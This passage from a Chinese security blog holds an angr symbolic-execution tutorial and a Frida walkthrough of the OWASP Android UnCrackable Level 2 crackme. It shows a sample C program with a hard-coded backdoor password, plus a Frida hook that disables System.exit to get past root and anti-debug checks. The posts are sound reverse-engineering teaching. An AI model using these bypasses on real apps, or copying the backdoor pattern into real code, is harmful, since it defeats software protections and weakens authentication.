    </footer>
  </div>
  
</article>


  
    <article id="post-angr使用说明" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/06/angr%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" class="article-date">
  <time datetime="2017-06-06T07:40:01.000Z" itemprop="datePublished">2017-06-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/06/angr%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">angr使用说明</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>angr是一个Python实现的二进制分析框架，实现了程序插桩、符号执行等二进制分析技术，还在安全顶会S&amp;P发表了一篇<a target="_blank" rel="noopener" href="https://www.cs.ucsb.edu/~vigna/publications/2016_SP_angrSoK.pdf">论文</a>。<br>该项目的Github: <a target="_blank" rel="noopener" href="https://github.com/angr/angr">https://github.com/angr/angr</a></p>
<h2 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h2><p>我的环境是Ubuntu 16.04，首先安装依赖库：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br></pre></td></tr></table></figure>
<p>virtualenvwrapper是一个Python虚拟环境，使用虚拟环境的主要原因是angr会修改libz3和libVEX，可能会影响其他程序的正常使用。<br>新建一个Python虚拟机环境：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ export WORKON_HOME&#x3D;~&#x2F;Envs</span><br><span class="line">$ mkdir -p $WORKON_HOME</span><br><span class="line">$ source &#x2F;usr&#x2F;share&#x2F;virtualenvwrapper&#x2F;virtualenvwrapper.sh</span><br><span class="line">$ mkvirtualenv angr</span><br></pre></td></tr></table></figure>
<p>用pip安装angr：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install angr</span><br></pre></td></tr></table></figure>

<h2 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h2><p>这个简单的<a target="_blank" rel="noopener" href="https://github.com/angr/angr-doc/tree/master/examples/fauxware">例子</a>说明了angr的用法。虽然通过逆向分析也很容易解决，但是为了介绍angr的基本用法，还是尝试用angr来解决。<br>下面是例子的源代码：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">authenticate</span><span class="params">(<span class="keyword">char</span> *username, <span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> stored_pw[<span class="number">9</span>];</span><br><span class="line">    stored_pw[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pwfile;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// evil back d00r</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    pwfile = open(username, O_RDONLY);</span><br><span class="line">    read(pwfile, stored_pw, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, stored_pw) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accepted</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the admin console, trusted user!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rejected</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> username[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">int</span> authed;</span><br><span class="line"></span><br><span class="line">    username[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    password[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: \n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, username, <span class="number">8</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password: \n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    authed = authenticate(username, password);</span><br><span class="line">    <span class="keyword">if</span> (authed) accepted();</span><br><span class="line">    <span class="keyword">else</span> rejected();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序需要输入用户名密码，authenticate()函数进行验证，失败则调用rejected()函数，成功则调用accepted()函数。<br>分析后，利用angr写出如下脚本：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_symbolic_execution</span>():</span></span><br><span class="line">    p = angr.Project(<span class="string">&#x27;fauxware&#x27;</span>)</span><br><span class="line">    state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    path = p.factory.path(state)</span><br><span class="line"></span><br><span class="line">    pathgroup = p.factory.path_group(path)</span><br><span class="line">    pathgroup.step(until=<span class="keyword">lambda</span> lpg: <span class="built_in">len</span>(lpg.active) &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pathgroup.active)):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;possible %d: &quot;</span> % i, pathgroup.active[i].state.posix.dumps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> basic_symbolic_execution()</span><br></pre></td></tr></table></figure>
<p>1.新建一个angr工程，Project()中是目标二进制程序的路径  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; angr.Project(&#39;fauxware&#39;)</span><br></pre></td></tr></table></figure>
<p>2.新建一个SimState对象  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = p.factory.entry_state()</span><br></pre></td></tr></table></figure>
<p>SimState对象在angr其中的一个子模块SimuVEX中，它追踪且记录着符号信息、符号对应的内存信息和符号对应的寄存器信息，以及打开的文件信息等。可以通过<code>Project.factory</code>这个容器中的任何一个方法来获取SimState对象。这个factory有多个构造函数，如：block、entry_state等。这里使用entry_state返回一个初始化到二进制entry point的SimState对象。<br>3.使用factory.path获取state的起点path对象  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path = p.factory.path(state)</span><br></pre></td></tr></table></figure>
<p>相当于path的起点，之后将沿着这个起点向后进行。<br>4.根据前面获取的函数入口点的path对象，利用path_group获取沿着path起点下面将会执行的path列表  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pathgroup = p.factory.path_group(path)</span><br></pre></td></tr></table></figure>
<p>5.接下来就让pathgroup对象一直执行下去，直到执行到可选择的路径个数大于一个，即产生选择分支的时候，再停止。对应例子程序中authenticate()函数的if (strcmp(password, sneaky) == 0)这个条件判断语句  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pathgroup.step(until = <span class="keyword">lambda</span> lpg: <span class="built_in">len</span>(lpg.active) &gt; <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>6.打印所有分支  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pathgroup.active)):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;possible %d: &quot;</span> % i, pathgroup.active[i].state.posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只是对angr有一个初步的认识，后面还要进一步学习它的其他用法和实现原理。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://github.com/angr/angr-doc">https://github.com/angr/angr-doc</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/06/angr%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" data-id="ckhe7o4mt004jchl7eouudtvv" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Frida解决Android-Crackme2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/04/Frida%E8%A7%A3%E5%86%B3Android-Crackme2/" class="article-date">
  <time datetime="2017-06-04T07:04:35.000Z" itemprop="datePublished">2017-06-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/04/Frida%E8%A7%A3%E5%86%B3Android-Crackme2/">Frida解决Android Crackme2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/Android/Level_02">crackme2</a>也是一道OWASP的Android题目，下面就用frida来解决它。<br>和crackme1一样，在模拟器中运行时会检测它是在root设备上运行的。<br>用JEB反编译之后，MainActivity如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sg.vantagepoint.uncrackable2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CodeCheck m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String arg5)</span> </span>&#123;</span><br><span class="line">        AlertDialog v0 = <span class="keyword">new</span> AlertDialog$Builder(((Context)<span class="keyword">this</span>)).create();</span><br><span class="line">        v0.setTitle(((CharSequence)arg5));</span><br><span class="line">        v0.setMessage(<span class="string">&quot;This in unacceptable. The app is now going to exit.&quot;</span>);</span><br><span class="line">        v0.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface$OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface arg2, <span class="keyword">int</span> arg3)</span> </span>&#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        v0.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">        v0.show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(MainActivity arg0, String arg1)</span> </span>&#123;</span><br><span class="line">        arg0.a(arg1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg5)</span> </span>&#123;</span><br><span class="line">        Void v3 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.init();</span><br><span class="line">        <span class="keyword">if</span>((b.a()) || (b.b()) || (b.c())) &#123;</span><br><span class="line">            <span class="keyword">this</span>.a(<span class="string">&quot;Root detected!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(a.a(<span class="keyword">this</span>.getApplicationContext())) &#123;</span><br><span class="line">            <span class="keyword">this</span>.a(<span class="string">&quot;App is debuggable!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> AsyncTask() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">protected</span> String <span class="title">a</span><span class="params">(Void[] arg3)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(!Debug.isDebuggerConnected()) &#123;</span><br><span class="line">                    SystemClock.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String arg3)</span> </span>&#123;</span><br><span class="line">                MainActivity.a(<span class="keyword">this</span>.a, <span class="string">&quot;Debugger detected!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> Object <span class="title">doInBackground</span><span class="params">(Object[] arg2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.a(((Void[])arg2));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPostExecute</span><span class="params">(Object arg1)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.a(((String)arg1));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.execute(<span class="keyword">new</span> Void[]&#123;v3, v3, v3&#125;);</span><br><span class="line">        <span class="keyword">this</span>.m = <span class="keyword">new</span> CodeCheck();</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg5);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">2130968603</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">verify</span><span class="params">(View arg5)</span> </span>&#123;</span><br><span class="line">        String v0 = <span class="keyword">this</span>.findViewById(<span class="number">2131427422</span>).getText().toString();</span><br><span class="line">        AlertDialog v1 = <span class="keyword">new</span> AlertDialog$Builder(((Context)<span class="keyword">this</span>)).create();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.m.a(v0)) &#123;</span><br><span class="line">            v1.setTitle(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">            v1.setMessage(<span class="string">&quot;This is the correct secret.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            v1.setTitle(<span class="string">&quot;Nope...&quot;</span>);</span><br><span class="line">            v1.setMessage(<span class="string">&quot;That\&#x27;s not it. Try again.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v1.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface$OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface arg1, <span class="keyword">int</span> arg2)</span> </span>&#123;</span><br><span class="line">                arg1.dismiss();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        v1.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试像前面一样hook OnClickListener，启动frida-server：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell </span><br><span class="line">generic:&#x2F; # .&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server</span><br></pre></td></tr></table></figure>
<p>启动crackme2应用，连接frida：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U sg.vantagepoint.uncrackable2</span><br><span class="line">...</span><br><span class="line">Failed to attach: ambiguous name; it matches: sg.vantagepoint.uncrackable2 (pid: 3844), sg.vantagepoint.uncrackable2 (pid: 3859)</span><br></pre></td></tr></table></figure>
<p>有两个名称相同的进程，可以验证一下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ frida-ps -U</span><br><span class="line">3844  sg.vantagepoint.uncrackable2</span><br><span class="line">3859  sg.vantagepoint.uncrackable2</span><br></pre></td></tr></table></figure>
<p>尝试注入父进程：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U 3844</span><br><span class="line">...</span><br><span class="line">Failed to attach: unable to access process with pid 3844 due to system restrictions; try &#96;sudo sysctl kernel.yama.ptrace_scope&#x3D;0&#96;, or run Frida as root</span><br></pre></td></tr></table></figure>
<p>查看反编译的MainActivity，程序加载了libfoo.so，onCreate()方法的第一行调用了一个native方法init()，这个方法应该是libfoo.so中的。一开始我用radare2打开armeabi目录下的so文件，查看init()函数，查看跳转到的子函数0x11c0。看到反汇编的代码很奇怪，其实这里的代码是thumb指令，而按照ARM模式进行了反汇编，调整方法是在visual mode下按<code>:</code>，输入命令<code>e asm.bits=16</code>，按照thumb模式进行反汇编。反汇编正常后，发现函数都是用地址表示，不知道调用的是什么函数。改为查看x86_64目录下的so文件。</p>
<blockquote>
<p>其实这里改为x86_64有多个原因:<br>(1)Mac上即使在radare2中输入<code>e asm.bits=16</code>也不能正常按thumb模式反汇编，在Ubuntu上能正常反汇编。<br>(2)正常反汇编arm的so文件看不到函数的名字，不知道调用了什么函数。<br>(3)后面frida hook native函数的时候，arm和x86都会有”Error: unable to intercept function at ***”的错误，只有x86_64能正常hook。不知道是不是这些开源软件在Mac上都有各种各样的bug，还是我用的不对。</p>
</blockquote>
<p>列出x86_64 so文件的导出函数：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ r2 libfoo.so</span><br><span class="line"> -- This page intentionally left blank.</span><br><span class="line">[0x000007a0]&gt; iE</span><br><span class="line">[Exports]</span><br><span class="line">vaddr&#x3D;0x00000a00 paddr&#x3D;0x00000a00 ord&#x3D;009 fwd&#x3D;NONE sz&#x3D;433 bind&#x3D;GLOBAL type&#x3D;FUNC name&#x3D;Java_sg_vantagepoint_uncrackable2_CodeCheck_bar</span><br><span class="line">vaddr&#x3D;0x000009f0 paddr&#x3D;0x000009f0 ord&#x3D;010 fwd&#x3D;NONE sz&#x3D;15 bind&#x3D;GLOBAL type&#x3D;FUNC name&#x3D;Java_sg_vantagepoint_uncrackable2_MainActivity_init</span><br><span class="line">vaddr&#x3D;0x00002048 paddr&#x3D;0x00001048 ord&#x3D;014 fwd&#x3D;NONE sz&#x3D;0 bind&#x3D;GLOBAL type&#x3D;NOTYPE name&#x3D;__bss_start</span><br><span class="line">vaddr&#x3D;0x00002048 paddr&#x3D;0x00001048 ord&#x3D;015 fwd&#x3D;NONE sz&#x3D;0 bind&#x3D;GLOBAL type&#x3D;NOTYPE name&#x3D;__bss_start</span><br><span class="line">vaddr&#x3D;0x0000204d paddr&#x3D;0x0000204d ord&#x3D;016 fwd&#x3D;NONE sz&#x3D;0 bind&#x3D;GLOBAL type&#x3D;NOTYPE name&#x3D;_end</span><br><span class="line"></span><br><span class="line">5 exports</span><br></pre></td></tr></table></figure>
<p>Java_sg_vantagepoint_uncrackable2_MainActivity_init和Java_sg_vantagepoint_uncrackable2_CodeCheck_bar两个函数是我们需要关注的，先看一下init()函数：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[0x000007a0]&gt; s 0x9f0</span><br><span class="line">[0x000009f0]&gt; V #切换到visual mode，p&#x2F;P切换view</span><br><span class="line">[0x000009f0 41% 672 libfoo.so]&gt; pd $r @ sym.Java_sg_vantagepoint_uncrackable2_MainActivity_init</span><br><span class="line">            ;-- Java_sg_vantagepoint_uncrackable2_MainActivity_init:</span><br><span class="line">            0x000009f0      50             push rax</span><br><span class="line">            0x000009f1      e82afeffff     call 0x820                  ;[1]</span><br><span class="line">            0x000009f6      c6054f160000.  mov byte [0x0000204c], 1    ; [0x204c:1]&#x3D;58 ; &quot;: (GNU) 4.9.x 20150123 (prerelease)&quot; 0x0000204c  ; &quot;: (GNU) 4.9.x 20150123 (prerelease)&quot;</span><br><span class="line">            0x000009fd      58             pop rax</span><br><span class="line">            0x000009fe      c3             ret</span><br><span class="line">            0x000009ff      90             nop</span><br></pre></td></tr></table></figure>
<p>查看init()函数的子函数0x820：<br><img src="/images/frida/antidebug.png"></p>
<blockquote>
<p>在<code>visual mode</code>下按<code>c</code>显示一个游标，移动游标到<code>call 0x820</code>这一行，按回车就跳转过去（按<code>u</code>跳转回来）</p>
</blockquote>
<p>这个函数里调用了fork、pthread_create、getppid、ptrace和waitpid等函数。这是一个基本的反调试技术，附加调试进程被阻止，因为已经有其他进程作为调试器连接。<br>我们可以让frida为我们生成一个进程而不是将它注入到运行中的进程中。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -f sg.vantagepoint.uncrackable2</span><br></pre></td></tr></table></figure>
<p>这样frida注入到Zygote中，生成我们的进程并且等待输入，使反调试失效。<br>在摆脱反调试之后，应用程序还是会检测root，点击OK后退出。可以用frida来hook System.exit函数，使其失效。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] Starting script&quot;</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        exitClass = Java.use(<span class="string">&quot;java.lang.System&quot;</span>);</span><br><span class="line">        exitClass.exit.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] System.exit called&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] Hooking calls to System.exit&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>关闭所有正在运行的crackme2进程，用frida运行它：  </p>
